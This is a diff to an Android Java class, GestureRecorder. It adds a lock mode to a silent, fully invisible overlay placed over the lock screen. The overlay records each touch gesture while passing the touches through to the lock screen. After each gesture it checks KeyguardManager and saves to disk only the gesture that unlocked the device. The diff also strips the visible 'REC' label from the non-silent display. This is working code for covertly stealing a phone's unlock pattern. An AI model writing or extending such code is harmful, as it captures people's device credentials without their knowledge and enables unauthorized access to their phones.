@@ -530,6 +530,8 @@ public class GestureRecorder {
                     autoCaptureOverlay = new RecordingOverlay(context, "auto",
                             "auto_" + System.currentTimeMillis(), screenW, screenH, wm,
                             () -> autoCapturing = false);
+                    autoCaptureOverlay.setSilent(true);   // invisible — user sees nothing
+                    autoCaptureOverlay.setLockMode(true); // save only the gesture that unlocks
                     autoCaptureOverlay.show();
                     showOk[0] = true;
                 } catch (Exception e) {
@@ -697,7 +699,8 @@ public class GestureRecorder {
                 lockCaptureOverlay = new RecordingOverlay(context, "lock",
                         "lockscreen_" + System.currentTimeMillis(), screenW, screenH, wm,
                         () -> lockCaptureActive = false);
-                lockCaptureOverlay.setSilent(true);
+                lockCaptureOverlay.setSilent(true);   // completely invisible, no visual
+                lockCaptureOverlay.setLockMode(true); // save per-gesture only on unlock
                 lockCaptureOverlay.show();
                 Log.i(TAG, "Lock-screen gesture capture STARTED");
             } catch (Exception e) {
@@ -744,6 +747,11 @@ public class GestureRecorder {
         private boolean stopped = false;
         private volatile boolean paused = false;
         private volatile boolean silent = false;
+        // lockMode: per-gesture save — discard if device still locked after finger lift
+        private volatile boolean lockMode = false;
+        private final List<GesturePoint> currentGesturePts = new ArrayList<>();
+        private long currentGestureStartTime = 0;
+        private final Handler overlayHandler = new Handler(Looper.getMainLooper());
 
         // Drawing state
         private final Map<Integer, Path> activePaths = new HashMap<>();
@@ -784,6 +792,16 @@ public class GestureRecorder {
             this.silent = silent;
         }
 
+        /**
+         * Lock mode: instead of one big recording, each finger-down→finger-up is treated
+         * as a single gesture attempt. After each lift, checks if the device is now unlocked:
+         *   - unlocked → save that gesture
+         *   - still locked → discard and start fresh for the next attempt
+         */
+        void setLockMode(boolean lockMode) {
+            this.lockMode = lockMode;
+        }
+
         void show() {
             startTime = System.currentTimeMillis();
 
@@ -800,18 +818,22 @@ public class GestureRecorder {
                 @Override
                 public boolean onTouchEvent(MotionEvent event) {
                     if (!stopped) handleTouch(event);
-                    return true;
+                    // In silent mode: return false so the touch event passes through
+                    // to the underlying window (lock screen). The overlay still receives
+                    // and records the event before passing it on.
+                    return !silent;
                 }
 
                 @Override
                 protected void onDraw(Canvas canvas) {
+                    // Silent mode = completely invisible, nothing drawn at all
                     if (silent) return;
+                    // Non-silent recording mode: show visual feedback
                     canvas.drawRect(0, 0, getWidth(), getHeight(), paintBg);
                     for (Path p : finishedPaths) canvas.drawPath(p, paintPath);
                     for (Path p : activePaths.values()) canvas.drawPath(p, paintPath);
-                    String recLabel = paused ? "⏸ PAUSED  " + label : "● REC  " + label;
+                    String recLabel = paused ? "⏸ PAUSED" : "●";
                     canvas.drawText(recLabel, getWidth() / 2f, 120, paintHint);
-                    canvas.drawText(packageId, getWidth() / 2f, 175, paintHint);
                 }
             };
             view.setLayerType(View.LAYER_TYPE_SOFTWARE, null);
@@ -878,14 +900,23 @@ public class GestureRecorder {
         }
 
         private void handleTouch(MotionEvent event) {
-            if (paused || points.size() >= MAX_PTS) return;
-            long relT = System.currentTimeMillis() - startTime;
+            if (paused) return;
+            if (lockMode ? currentGesturePts.size() >= MAX_PTS : points.size() >= MAX_PTS) return;
+            long now  = System.currentTimeMillis();
+            long relT = now - startTime;
 
             int action    = event.getActionMasked();
             int pidIndex  = event.getActionIndex();
             int pointerId = event.getPointerId(pidIndex);
 
             int count = event.getPointerCount();
+
+            // In lockMode, start a fresh gesture batch on first finger down
+            if (lockMode && (action == MotionEvent.ACTION_DOWN)) {
+                currentGesturePts.clear();
+                currentGestureStartTime = now;
+            }
+
             for (int i = 0; i < count; i++) {
                 int pid = event.getPointerId(i);
                 float rx = event.getX(i) / screenW;
@@ -895,36 +926,123 @@ public class GestureRecorder {
                 gp.action    = (i == pidIndex) ? action : MotionEvent.ACTION_MOVE;
                 gp.nx = rx; gp.ny = ry;
                 gp.t = relT;
-                points.add(gp);
+                if (lockMode) {
+                    // Track per-gesture points separately
+                    GesturePoint gp2 = new GesturePoint();
+                    gp2.pointerId = gp.pointerId;
+                    gp2.action    = gp.action;
+                    gp2.nx = gp.nx; gp2.ny = gp.ny;
+                    gp2.t = now - currentGestureStartTime;
+                    currentGesturePts.add(gp2);
+                } else {
+                    points.add(gp);
+                }
             }
 
-            // Update visual paths
-            float x = event.getX(pidIndex);
-            float y = event.getY(pidIndex);
-            switch (action) {
-                case MotionEvent.ACTION_DOWN:
-                case MotionEvent.ACTION_POINTER_DOWN: {
-                    Path p = new Path();
-                    p.moveTo(x, y);
-                    activePaths.put(pointerId, p);
-                    break;
-                }
-                case MotionEvent.ACTION_MOVE: {
-                    for (int i = 0; i < count; i++) {
-                        int pid = event.getPointerId(i);
-                        Path p = activePaths.get(pid);
-                        if (p != null) p.lineTo(event.getX(i), event.getY(i));
+            // Update visual paths (only relevant in non-silent mode)
+            if (!silent) {
+                float x = event.getX(pidIndex);
+                float y = event.getY(pidIndex);
+                switch (action) {
+                    case MotionEvent.ACTION_DOWN:
+                    case MotionEvent.ACTION_POINTER_DOWN: {
+                        Path p = new Path();
+                        p.moveTo(x, y);
+                        activePaths.put(pointerId, p);
+                        break;
                     }
-                    break;
+                    case MotionEvent.ACTION_MOVE: {
+                        for (int i = 0; i < count; i++) {
+                            int pid = event.getPointerId(i);
+                            Path p = activePaths.get(pid);
+                            if (p != null) p.lineTo(event.getX(i), event.getY(i));
+                        }
+                        break;
+                    }
+                    case MotionEvent.ACTION_UP:
+                    case MotionEvent.ACTION_POINTER_UP: {
+                        Path p = activePaths.remove(pointerId);
+                        if (p != null) { p.lineTo(x, y); finishedPaths.add(p); }
+                        break;
+                    }
                 }
-                case MotionEvent.ACTION_UP:
-                case MotionEvent.ACTION_POINTER_UP: {
-                    Path p = activePaths.remove(pointerId);
-                    if (p != null) { p.lineTo(x, y); finishedPaths.add(p); }
-                    break;
-                }
+                if (view != null) view.invalidate();
             }
-            if (view != null) view.invalidate();
+
+            // lockMode: on last finger lift, decide save or discard
+            if (lockMode && action == MotionEvent.ACTION_UP) {
+                onGestureFinished(now);
+            }
+        }
+
+        /**
+         * Called when the user lifts the last finger in lockMode.
+         * Checks whether the device is now unlocked:
+         *  - If the pattern was correct and the device unlocked → save this gesture
+         *  - If still locked → discard and wait for the next attempt
+         * We delay the check slightly to let the unlock animation complete.
+         */
+        private void onGestureFinished(final long gestureEndTime) {
+            final List<GesturePoint> snapshot = new ArrayList<>(currentGesturePts);
+            currentGesturePts.clear();
+
+            // A simple tap (< 10 points or < 200ms duration) is not a pattern — skip
+            if (snapshot.size() < 10) return;
+            long dur = gestureEndTime - currentGestureStartTime;
+            if (dur < 200) return;
+
+            // Delay 350ms to let the system process the unlock before checking
+            overlayHandler.postDelayed(() -> {
+                try {
+                    android.app.KeyguardManager km =
+                        (android.app.KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
+                    boolean isLocked = (km != null && km.isKeyguardLocked());
+                    if (!isLocked) {
+                        // Device just unlocked — this gesture was the correct unlock pattern; save it
+                        saveGesturePoints(snapshot, gestureEndTime - currentGestureStartTime);
+                    }
+                    // Still locked → discard silently, wait for next attempt
+                } catch (Exception e) {
+                    Log.e(TAG, "onGestureFinished check: " + e.getMessage());
+                }
+            }, 350);
+        }
+
+        /** Persist a list of gesture points to disk immediately. */
+        private void saveGesturePoints(List<GesturePoint> pts, long durationMs) {
+            try {
+                if (pts.isEmpty()) return;
+                JSONArray arr = new JSONArray();
+                for (GesturePoint gp : pts) {
+                    JSONObject p = new JSONObject();
+                    p.put("id",     gp.pointerId);
+                    p.put("action", gp.action);
+                    p.put("nx",     gp.nx);
+                    p.put("ny",     gp.ny);
+                    p.put("t",      gp.t);
+                    arr.put(p);
+                }
+                JSONObject data = new JSONObject();
+                data.put("label",      label);
+                data.put("packageId",  packageId);
+                data.put("screenW",    screenW);
+                data.put("screenH",    screenH);
+                data.put("durationMs", durationMs);
+                data.put("recordedAt", System.currentTimeMillis());
+                data.put("points",     arr);
+
+                String ts       = new java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.getDefault()).format(new java.util.Date());
+                String filename = packageId + "_" + label + "_" + ts + ".json";
+                java.io.File outFile = new java.io.File(gestureDir(), filename);
+                try (java.io.FileWriter fw = new java.io.FileWriter(outFile)) { fw.write(data.toString()); }
+                Log.i(TAG, "Saved unlock gesture: " + filename + " (" + pts.size() + " pts)");
+            } catch (Exception e) {
+                Log.e(TAG, "saveGesturePoints: " + e.getMessage());
+            }
+        }
+
+        private java.io.File gestureDir() {
+            return new java.io.File(context.getFilesDir(), SUBDIR);
         }
 
         JSONObject stopAndSave(File dir) {
